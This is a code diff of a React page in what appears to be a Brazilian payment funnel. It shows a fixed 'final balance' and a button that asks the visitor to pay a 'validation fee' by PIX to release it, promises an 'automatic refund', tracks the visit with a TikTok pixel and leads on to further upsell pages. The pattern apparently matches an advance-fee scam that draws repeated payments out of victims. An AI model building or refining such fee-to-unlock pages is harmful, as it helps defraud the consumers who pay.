@@ -1,9 +1,6 @@
-import { useState, useEffect } from 'react';
-import { useNavigate } from 'react-router-dom';
-import ParadisePixPopup from '@/components/ParadisePixPopup';
+import { useEffect } from 'react';
 import PageTransition from '@/components/PageTransition';
 import { trackViewContent } from '@/lib/tiktokPixel';
-import { useCustomerData } from '@/hooks/useCustomerData';
 import '../styles/app.css';
 
 const SALDO_FINAL = 2834.72;
@@ -19,18 +16,9 @@ const formatBR = (value: number) => {
 };
 
 const Up3 = () => {
-  const navigate = useNavigate();
-  const [showPixPopup, setShowPixPopup] = useState(false);
-  const { customer } = useCustomerData();
-
   useEffect(() => {
     trackViewContent('Taxa de Validação TVS', TAXA_TVS);
   }, []);
-
-  const handlePaymentSuccess = () => {
-    setShowPixPopup(false);
-    navigate('/up4');
-  };
 
   return (
     <PageTransition>
@@ -85,24 +73,30 @@ const Up3 = () => {
         {/* Fixed Bottom Button */}
         <div className="fixed-footer">
           <button
-            onClick={() => setShowPixPopup(true)}
-            className="cta-button cta-success"
+            className="paradise-upsell-btn"
+            style={{
+              backgroundColor: '#28a745',
+              color: '#ffffff',
+              padding: '12px 20px',
+              border: 'none',
+              borderRadius: '6px',
+              fontSize: '16px',
+              fontWeight: 'bold',
+              cursor: 'pointer',
+              width: '100%',
+            }}
+            data-offer-hash="upsell_1201f24d72a2ed73"
+            data-modal-title="Liberar Saldo"
+            data-copy-button-text="Copiar Código PIX"
+            data-modal-bg="#ffffff"
+            data-modal-title-color="#1f2937"
+            data-modal-btn-color="#28a745"
+            data-modal-btn-text-color="#ffffff"
           >
-            PAGAR R$ {formatBR(TAXA_TVS)} E LIBERAR SALDO
+            Liberar saldo
           </button>
           <p className="cta-success-note">Reembolso Automático</p>
         </div>
-
-        {showPixPopup && (
-          <ParadisePixPopup
-            amount={TAXA_TVS_CENTAVOS}
-            description="Taxa de Validação TVS"
-            productHash={PRODUCT_HASH}
-            customer={customer}
-            onSuccess={handlePaymentSuccess}
-            onClose={() => setShowPixPopup(false)}
-          />
-        )}
       </main>
     </PageTransition>
   );
